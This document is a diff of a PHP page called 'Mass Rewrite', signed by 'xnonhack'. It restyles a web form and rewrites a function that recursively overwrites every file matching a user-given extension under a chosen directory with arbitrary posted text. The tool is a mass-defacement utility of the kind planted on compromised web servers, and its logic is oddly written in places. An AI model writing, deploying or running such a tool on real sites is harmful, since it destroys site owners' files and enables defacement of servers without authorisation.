@@ -1,86 +1,274 @@
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-<title>Mass Rewrite File</title>
 <style type="text/css">
-	th {
-		text-align:center;
-	}
+@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
+body {
+  font-family: 'Ubuntu Mono', monospace;
+  color: #8a8a8a;
+  background:rgba(222,222,222,0.73);
+}
+
+table {
+  background:#fff;
+  line-height: 40px;
+  border-collapse: separate;
+  border-spacing: 0;
+  border: 25px solid #fff;
+  width: 50%;
+  margin: 50px auto;
+  border-radius: 20px;
+  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
+}
+
+thead tr:first-child {
+  background: #fff;
+  color: #8a8a8a;
+  border: none;
+}
+
+th:first-child,
+td:first-child {
+  padding: 0 15px 0 20px;
+}
+
+th {
+  font-weight: 500;
+}
+
+thead tr:last-child th {
+  border-bottom: none;
+}
+
+tr.hover:hover {
+  background-color: #dedede;
+  cursor: default;
+}
+tbody tr:last-child td {
+  border: none;
+}
+
+
+tbody td {
+  border-bottom:none;
+}
+
+td:last-child {
+  padding-right: 10px;
+}
+textarea {
+  font-family: 'Ubuntu Mono', monospace;
+  background:rgba(222,222,222,0.73);
+  border:1px solid rgba(222,222,222,0.73);
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:-2px;
+  width:100%;
+  resize:none;
+  border-radius: 8px;
+  height:400px;
+  color:#8a8a8a;
+  padding: 12px 20px;
+  -moz-border-bottom-colors: none;
+  -moz-border-left-colors: none;
+  -moz-border-right-colors: none;
+  -moz-border-top-colors: none;
+  outline:none;
+}
+  ::-webkit-scrollbar {
+  width: 0px;
+  height: 0px;
+}
+  ::-webkit-scrollbar-button:start:decrement,
+  ::-webkit-scrollbar-button:end:increment  {
+  height: 0px;
+  background-color: transparent;
+}
+  ::-webkit-scrollbar-track-piece  {
+  background-color: #eeeeee;
+}
+  ::-webkit-scrollbar-thumb:vertical {
+  height: 0px;
+  background-color: #666;
+  border: 0px solid #eee;
+  -webkit-border-radius: 16px;
+}
+
+input[type=submit] {
+  font-family: 'Ubuntu Mono', monospace;
+  padding:13px;
+  outline:none;
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:10px;
+  color:#8a8a8a;
+  font-weight: bold;
+  border-radius: 8px;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
+}
+input[type=text] {
+  font-family: 'Ubuntu Mono', monospace;
+  padding:7px 5px;
+  outline:none;
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:10px;
+  color:#8a8a8a;
+  border-bottom:3px solid rgba(222,222,222,0.73);
+  border-top:none;
+  border-left:none;
+  border-right:none;
+}
+select {
+  font-family: 'Ubuntu Mono', monospace;
+  padding:7px 5px;
+  outline:none;
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:10px;
+  color:#8a8a8a;
+  border-bottom:3px solid rgba(222,222,222,0.73);
+  border-top:none;
+  border-left:none;
+  border-right:none;
+}
+.alert {
+  text-align: center;
+  width: 100%;
+  margin-top:10px;
+  margin-left:-10px;
+  margin-bottom:10px;
+  border: 1px solid transparent;
+  border-radius: 8px;
+}
+.alert-success {
+  background-color: #91cf91;
+  border-color: #80c780;
+  color: #3d8b3d;
+}
+.alert-danger {
+  background-color: #e27c79;
+  border-color: #dd6864;
+  color: #9f2723;
+}
+textarea:focus,
+th.line {
+  border:1px solid #dedede;
+}
+.icon {
+  width:25px;
+  height:25px;
+  margin-bottom:-6px;
+  margin-left:-8px;
+}
+textarea:hover,  
+a.tools:hover, 
+a.back:hover,
+select:hover, 
+input[type=submit]:hover {
+    cursor:pointer;
+    border:1px solid red;
+    text-decoration:none;
+}
+select:focus,
+input:focus {
+  background:rgba(222,222,222,0.73);
+  border-left:none;
+  border-right:none;
+  border-top:none;
+  border-bottom: 3px solid red;
+}
+select:hover, 
+input[type=text]:hover {
+  border-left:none;
+  border-right:none;
+  border-top:none;
+  border-bottom:3px solid red;
+}
+input {
+    width:100%;
+}
 </style>
-<br>
-<div class="container" width="50%">
-<table width="100%" align="center" class="table table-bordered">
-	<thead class="thead-light">
-		<tr>
-			<th>MASS REWRITE FILE</th>
-		</tr>
-	</thead>
-<form method="post">
-	<tr>
-		<td>
-			<input class="form-control" type="text" name="dir" value="<?php print @getcwd() ?>">
-		</td>
-	</tr>
-	<tr>
-		<td>
-			<select name="mode" class="form-control">
-				<option>Rewrite</option>
-				<option>Apender</option>
-			</select>
-		</td>
-	</tr>
-	<tr>
-		<td>
-			<input class="form-control" type="text" name="type" placeholder="type ext : html, php">
-		</td>
-	</tr>
-	<tr>
-		<td>
-			<textarea style="height:350px;" class="form-control" name="text"></textarea>
-		</td>
-	</tr>
-	<tr>
-		<td>
-			<input class="btn btn-primary" style="width:100%" type="submit" name="submit" value="MASS">
-		</td>
-	</tr>
-</form>
+<table>
+    <thead>
+        <tr>
+            <th>
+                <h2>MASS REWRITE</h2>
+            </th>
+        </tr>
+    </thead>
+    <form method="post">
+        <tr>
+            <td>
+                <input type="text" name="dir" value="<?= getcwd() ?>">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <input type="text" name="type" placeholder="type">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <textarea name="text"></textarea>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <input type="submit" name="submit">
+            </td>
+        </tr>
+    </form>
 <?php
 if (isset($_POST['submit'])) {
-	@masswrite($_POST['mode'], $_POST['dir'], $_POST['type'], $_POST['text']);
+    mass($_POST['dir'], $_POST['type'], $_POST['text']);
 }
-function masswrite($mode, $dir, $type, $text) {
-	switch ($mode) {
-		case 'Apender':
-			$_mode = "a";
-			break;
-		
-		case 'Rewrite':
-			$_mode = "w";
-			break;
-	}
-	if ($handle = @opendir($dir)) {
-		while (($file = @readdir($handle)) !== false) {
-			if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
-				print("<tr><td>
-					<div class='alert alert-success' role='alert'>
-					<b>".$dir.DIRECTORY_SEPARATOR.$file."</b> Successfully !
-					  <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
-					  <span aria-hidden='true'>&times;</span></button>
-					</div></td></tr>");
-				$fp = @fopen($dir.DIRECTORY_SEPARATOR.$file, $_mode);
-				if ($fp) {
-					@fwrite($fp, $text);
-				} else {
-					print("<tr><td>
-						<div class='alert alert-danger' role='alert'>
-						Error. Access Danied
-						<div></td></tr>");
-				}
-			}
-		}
-	}
+function mass($dir, $type, $text) {
+    if(is_writable($dir)) {
+        $getfile = scandir($dir);
+        foreach($getfile as $file) {
+            $path = $dir.DIRECTORY_SEPARATOR.$file;
+            if($file === '.' || filetype($path) == 'file') {
+                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
+                    ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php
+                file_put_contents($path, $text);
+                endif;
+            } elseif($file === '..' || filetype($path) == 'file') {
+                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
+                    ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php
+                file_put_contents($path, $text);
+                endif;
+            } else {
+                if(is_dir($path)) {
+                    if(is_writable($path)) {
+                        @file_put_contents($path, $text);
+                        mass($path,$type,$text);
+                    }
+                }
+            }
+        }
+    }
 }
 ?>
 </table>
+<center>
+    &copy; copyright 2020 by xnonhack
+</center>
